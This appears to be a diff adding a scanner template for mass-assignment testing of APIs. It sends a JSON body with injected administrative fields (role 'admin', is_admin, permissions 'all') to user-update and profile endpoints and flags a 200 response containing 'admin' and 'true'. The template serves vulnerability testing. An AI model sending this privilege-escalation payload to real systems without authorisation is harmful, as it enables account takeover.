@@ -1,0 +1,41 @@
+id: api-logic-mass-assignment
+info:
+  name: API Logic - Mass Assignment (Role Elevation)
+  author: WhiteFatalis
+  severity: high
+  description: Attempts to elevate privileges by injecting administrative fields into JSON requests.
+  tags: api, logic, mass-assignment
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/users/update"
+      - "{{BaseURL}}/api/profile"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "username": "test",
+        "email": "test@example.com",
+        "role": "admin",
+        "is_admin": true,
+        "isAdmin": true,
+        "group": "administrators",
+        "permissions": ["all"]
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "true"
+        condition: and
+        # This matcher is weak; in real life manual verification is needed, but this flags potential success.
